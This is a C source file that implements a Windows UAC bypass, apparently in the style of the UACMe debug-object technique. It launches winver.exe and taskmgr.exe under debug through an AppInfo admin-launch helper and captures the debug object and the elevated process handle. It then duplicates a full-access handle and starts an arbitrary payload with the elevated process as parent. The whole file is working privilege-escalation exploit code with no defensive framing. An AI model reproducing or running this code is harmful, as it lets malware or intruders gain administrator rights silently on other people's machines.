#include "_riftdll.h"

NTSTATUS ucmxCreateProcessFromParent(
	_In_ HANDLE ParentProcess,
	_In_ LPWSTR Payload)
{
	NTSTATUS status = STATUS_UNSUCCESSFUL;
	size_t size = 0x30;

	STARTUPINFOEX si;
	PROCESS_INFORMATION pi;

	RtlSecureZeroMemory(&pi, sizeof(pi));
	RtlSecureZeroMemory(&si, sizeof(si));
	si.StartupInfo.cb = sizeof(STARTUPINFOEX);

	do {
		if (size > 1024)
			break;

		si.lpAttributeList = malloc(size, 0);
		if (si.lpAttributeList) {
			if (InitializeProcThreadAttributeList(si.lpAttributeList, 1, 0, &size)) {
				if (UpdateProcThreadAttribute(si.lpAttributeList, 0,
					PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &ParentProcess, sizeof(HANDLE), 0, 0)) //-V616
				{
					si.StartupInfo.dwFlags = STARTF_USESHOWWINDOW;
					si.StartupInfo.wShowWindow = SW_SHOW;

					if (CreateProcessW(NULL,
						Payload,
						NULL,
						NULL,
						FALSE,
						CREATE_UNICODE_ENVIRONMENT | EXTENDED_STARTUPINFO_PRESENT,
						NULL,
						0, // g_ctx->szSystemRoot,
						(LPSTARTUPINFO)&si,
						&pi))
					{
						CloseHandle(pi.hThread);
						CloseHandle(pi.hProcess);
						status = STATUS_SUCCESS;
					}
				}
			}

			if (si.lpAttributeList)
				DeleteProcThreadAttributeList(si.lpAttributeList); //dumb empty routine

			free(si.lpAttributeList);
		}
	} while (GetLastError() == ERROR_INSUFFICIENT_BUFFER);

	return status;
}

NTSTATUS ucmDebugObjectMethod(
	_In_ LPWSTR lpszPayload
) {
	//uint32 retryCount = 0;
	NTSTATUS status = STATUS_ACCESS_DENIED;

	// Spawn initial non elevated victim process under debug.

	//do { /* remove comment for attempt to spam debug object within thread pool */
	PCWSTR szSysDir;
	SHGetKnownFolderPath(&FOLDERID_System, 0, 0, &szSysDir);
	WCHAR szSysRoot[4];
	CopyMemory(szSysRoot, szSysDir, 3 * sizeof(WCHAR));
	szSysRoot[3] = L'\0';

	size_t nResult;
	StringCchLengthW(szSysDir, MAX_PATH, &nResult);
	WCHAR szProcess[MAX_PATH];
	CopyMemory(szProcess, szSysDir, (nResult + 1) * sizeof(WCHAR));
	StringCchCatW(szProcess, MAX_PATH, L"\\winver.exe");

	PROCESS_INFORMATION procInfo;
	HANDLE dbgHandle = 0;
	if (!AicLaunchAdminProcess(szProcess, szProcess, 0, CREATE_UNICODE_ENVIRONMENT | DEBUG_PROCESS,
		szSysRoot, L"WinSta0\\Default", 0, INFINITE, SW_HIDE, &procInfo)
		) {
		status = STATUS_UNSUCCESSFUL;
		goto EXIT;
	}

	// Capture debug object handle.
	typedef NTSTATUS(NTAPI* pNtQueryInformationProcess)(
		_In_  HANDLE ProcessHandle,
		_In_  ULONG  ProcessInformationClass,
		_Out_ void*  ProcessInformation,
		_In_  ULONG  ProcessInformationLength,
		_Out_ PULONG ReturnLength
		);
	pNtQueryInformationProcess NtQueryInformationProcess = GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "NtQueryInformationProcess");
	status = NtQueryInformationProcess(procInfo.hProcess, 0x1e, &dbgHandle, sizeof(HANDLE), 0);
	if (!(status >= 0)) {
		TerminateProcess(procInfo.hProcess, 0);
		CloseHandle(procInfo.hThread);
		CloseHandle(procInfo.hProcess);
		goto EXIT;
	}

	// Detach debug and kill non elevated victim process.
	typedef NTSTATUS(NTAPI* pNtRemoveProcessDebug)(
		_In_ HANDLE ProcessHandle,
		_In_ HANDLE DebugObjectHandle
		);
	pNtRemoveProcessDebug NtRemoveProcessDebug = GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "NtRemoveProcessDebug");
	NtRemoveProcessDebug(procInfo.hProcess, dbgHandle);
	TerminateProcess(procInfo.hProcess, 0);
	CloseHandle(procInfo.hThread);
	CloseHandle(procInfo.hProcess);

	//} while (++retryCount < 20);

	// Spawn elevated victim under debug.
	CopyMemory(szProcess, szSysDir, (nResult + 1) * sizeof(WCHAR));
	CoTaskMemFree(szSysDir);
	StringCchCatW(szProcess, MAX_PATH, L"\\taskmgr.exe");

	RtlSecureZeroMemory(&procInfo, sizeof(procInfo));
	DEBUG_EVENT dbgEvent;
	RtlSecureZeroMemory(&dbgEvent, sizeof(dbgEvent));
	if (!AicLaunchAdminProcess(szProcess, szProcess, 1, CREATE_UNICODE_ENVIRONMENT | DEBUG_PROCESS,
		szSysRoot, L"WinSta0\\Default", 0, INFINITE, SW_HIDE, &procInfo)
		) {
		status = STATUS_UNSUCCESSFUL;
		goto EXIT;
	}

	// Update thread TEB with debug object handle to receive debug events.
	typedef VOID(NTAPI* pDbgUiSetThreadDebugObject)(
		_In_ HANDLE DebugObject
		);
	pDbgUiSetThreadDebugObject DbgUiSetThreadDebugObject = GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "DbgUiSetThreadDebugObject");
	DbgUiSetThreadDebugObject(dbgHandle);
	HANDLE dbgProcessHandle = 0;

	// Debugger wait cycle.
	while (TRUE) {
		if (!WaitForDebugEvent(&dbgEvent, INFINITE))
			break;

		switch (dbgEvent.dwDebugEventCode) {
			// Capture initial debug event process handle.
		case CREATE_PROCESS_DEBUG_EVENT:
			dbgProcessHandle = dbgEvent.u.CreateProcessInfo.hProcess;
			break;
		}

		if (dbgProcessHandle)
			break;

		ContinueDebugEvent(dbgEvent.dwProcessId, dbgEvent.dwThreadId, DBG_CONTINUE);
	}

	if (dbgProcessHandle == NULL)
		goto EXIT;

	// Create new handle from captured with PROCESS_ALL_ACCESS.
	HANDLE hCP = GetCurrentProcess();
	HANDLE dupHandle;
	status = DuplicateHandle(dbgProcessHandle, hCP, hCP, &dupHandle, PROCESS_ALL_ACCESS, 0, 0);
	if (status) {
		// Run new process with parent set to duplicated process handle.
		ucmxCreateProcessFromParent(dupHandle, lpszPayload);
		CloseHandle(dupHandle);
	}

#pragma warning(push)
#pragma warning(disable: 6387)
	DbgUiSetThreadDebugObject(0);
#pragma warning(pop)

	CloseHandle(dbgHandle);
	dbgHandle = 0;

	CloseHandle(dbgProcessHandle);

	// Release victim process.
	CloseHandle(procInfo.hThread);
	TerminateProcess(procInfo.hProcess, 0);
	CloseHandle(procInfo.hProcess);

EXIT:
	if (dbgHandle)
		CloseHandle(dbgHandle);
	//	SetEvent(g_ctx->SharedContext.hCompletionEvent);
	return status;
}